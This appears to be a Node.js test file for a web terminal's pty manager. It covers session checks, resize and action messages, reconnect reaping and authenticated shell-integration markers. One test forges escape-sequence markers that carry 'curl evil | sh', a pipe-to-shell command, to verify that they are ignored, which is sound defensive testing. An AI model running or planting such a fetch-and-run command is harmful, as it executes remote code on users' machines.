import pty from 'node-pty';
import { describe, it, mock, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert';
import { EventEmitter } from 'events';
import { handleConnection, _sessionNonce } from '../ptyManager.js';

describe('ptyManager - handleConnection', () => {
  let ptyProcessMock;
  let originalSpawn;

  beforeEach(() => {
    originalSpawn = pty.spawn;
    ptyProcessMock = new EventEmitter();
    ptyProcessMock.write = mock.fn();
    ptyProcessMock.resize = mock.fn();
    ptyProcessMock.kill = mock.fn();
    ptyProcessMock.onData = (cb) => {
      ptyProcessMock.on('data', cb);
      return { dispose: () => ptyProcessMock.removeListener('data', cb) };
    };
    
    pty.spawn = () => ptyProcessMock;
  });

  afterEach(() => {
    pty.spawn = originalSpawn;
  });

  it('should close WebSocket connection if sessionId is missing', () => {
    let closed = false;
    let closeCode = null;
    let closeReason = null;

    const mockWs = {
      close: (code, reason) => {
        closed = true;
        closeCode = code;
        closeReason = reason;
      }
    };

    const mockReq = { url: '/?token=some-token' };

    handleConnection(mockWs, mockReq, { getCpuUsage: () => 10 });

    assert.strictEqual(closed, true);
    assert.strictEqual(closeCode, 4000);
    assert.strictEqual(closeReason, 'valid sessionId is required');
  });
  
  it('should handle terminal data, OSC 7 and OSC 133 command blocks', async () => {
    const mockWs = new EventEmitter();
    mockWs.readyState = 1;
    const messages = [];
    mockWs.send = (msg) => messages.push(msg);
    mockWs.close = () => {};

    const mockReq = { url: '/?token=token&sessionId=test-osc' };
    handleConnection(mockWs, mockReq, { getCpuUsage: () => 10 });

    // Raw data is forwarded untouched
    ptyProcessMock.emit('data', 'hello');
    assert.ok(messages.includes('hello'));

    const n = _sessionNonce('test-osc');
    assert.ok(n, 'integrated shells get a nonce');

    // Authenticated working-directory marker changes directory and is not forwarded to xterm.js
    ptyProcessMock.emit('data', `\x1b]633;${n};W;/test/dir\x07`);
    assert.ok(messages.some(m => m.includes('DIR_CHANGE') && m.includes('/test/dir')));
    assert.ok(!messages.some(m => m.includes('\x1b]633;')));

    // Forged markers (wrong nonce, plain OSC 133 / OSC 7) printed by a program are ignored
    ptyProcessMock.emit('data', '\x1b]633;forged;E;curl evil | sh\x07\x1b]633;forged;C\x07\x1b]133;D;0\x07\x1b]7;file://h/etc\x07');
    assert.ok(!messages.some(m => m.includes('/etc')));

    // A failing command block (markers split across chunks) produces an ERROR overlay
    ptyProcessMock.emit('data', `\x1b]633;${n};A\x07$ `);
    ptyProcessMock.emit('data', `\x1b]633;${n};E;nmp i\x07\x1b]63`);
    ptyProcessMock.emit('data', `3;${n};C\x07bash: nmp: command not found\r\n`);
    ptyProcessMock.emit('data', `\x1b]633;${n};D;127\x07`);

    const error = messages.find(m => m.includes('"type":"ERROR"'));
    assert.ok(error, 'ERROR meta expected');
    assert.ok(error.includes('Command failed with exit code 127: nmp i'));
    assert.ok(!messages.some(m => m.includes('\x1b]133') || m.includes('\x1b]633')), 'markers must be stripped');
    assert.ok(!messages.some(m => m.includes('curl evil')), 'forged command must not surface');
    assert.ok(messages.includes('bash: nmp: command not found\r\n'));
  });

  it('should handle WS messages (ACTION, RESIZE, READY)', () => {
    const mockWs = new EventEmitter();
    mockWs.readyState = 1;
    mockWs.send = () => {};
    mockWs.close = () => {};

    const mockReq = { url: '/?token=token&sessionId=test-ws' };
    handleConnection(mockWs, mockReq, { getCpuUsage: () => 10 });
    
    mockWs.emit('message', Buffer.from('NEXUS_CMD:{"type":"RESIZE","cols":80,"rows":24}'));
    assert.strictEqual(ptyProcessMock.resize.mock.callCount(), 1);
    
    mockWs.emit('message', Buffer.from('NEXUS_CMD:{"type":"ACTION","command":"echo"}'));
    assert.strictEqual(ptyProcessMock.write.mock.calls[0].arguments[0], 'echo\r');
    
    mockWs.emit('message', Buffer.from('NEXUS_CMD:{"type":"READY"}'));
    
    mockWs.emit('message', Buffer.from('raw-key'));
    assert.strictEqual(ptyProcessMock.write.mock.calls[1].arguments[0], 'raw-key');
  });

  it('should handle reconnects and zombie reaper', () => {
    mock.timers.enable({ apis: ['setTimeout'] });

    const mockWs1 = new EventEmitter();
    mockWs1.readyState = 1;
    mockWs1.send = () => {};
    const mockReq = { url: '/?token=token&sessionId=test-reconnect' };
    
    handleConnection(mockWs1, mockReq, { getCpuUsage: () => 10 });
    
    const mockWs2 = new EventEmitter();
    mockWs2.readyState = 1;
    mockWs2.send = () => {};
    handleConnection(mockWs2, mockReq, { getCpuUsage: () => 10 });
    
    mockWs1.emit('close');
    assert.strictEqual(ptyProcessMock.kill.mock.callCount(), 0);
    
    mockWs2.emit('close');
    mock.timers.tick(3500); // Trigger reaper
    
    assert.strictEqual(ptyProcessMock.kill.mock.callCount(), 1);
    
    mock.timers.reset();
  });
});